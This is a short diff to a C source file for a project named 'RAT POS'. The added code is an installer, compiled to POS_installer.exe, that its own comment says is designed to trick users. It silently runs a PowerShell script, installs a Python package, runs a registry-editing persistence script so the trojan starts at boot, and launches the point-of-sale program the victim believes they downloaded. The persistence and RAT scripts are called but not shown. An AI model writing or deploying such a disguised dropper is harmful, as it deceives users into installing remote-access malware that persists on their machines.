@@ -1,14 +1,21 @@
+/*
+Project: RAT POS
+Author: Swager
+Description: this file is compiled to POS_installer.exe and is designed to trick the user into installing python
+and triggering add_startup.py so that pos.py runs on startup.
+
+*/
+
 #include <Windows.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <tchar.h>
 
 int main()
 {
-    printf("Installing now, please install python to run the POS.\n");
-    system("start /WAIT python-3.8.1.exe");
-    system("setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
-    system("python add_startup.py");
-    system("python ../UDP_Connection/pos.py\n");
-    //system("%homepath%\\documents\\ourFolder\\ratScript.ps1");
+    system("start /WAIT initialize.ps1"); //powershell script that checks if python is installed
+    system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
+    system("python ./persistence/add_startup.py\n"); //starts the registry editing py file after python is installed
+    system("python ./UDP_Connection/pos.py\n"); //starts the POS the user thinks they downloaded
     return 0;
 }
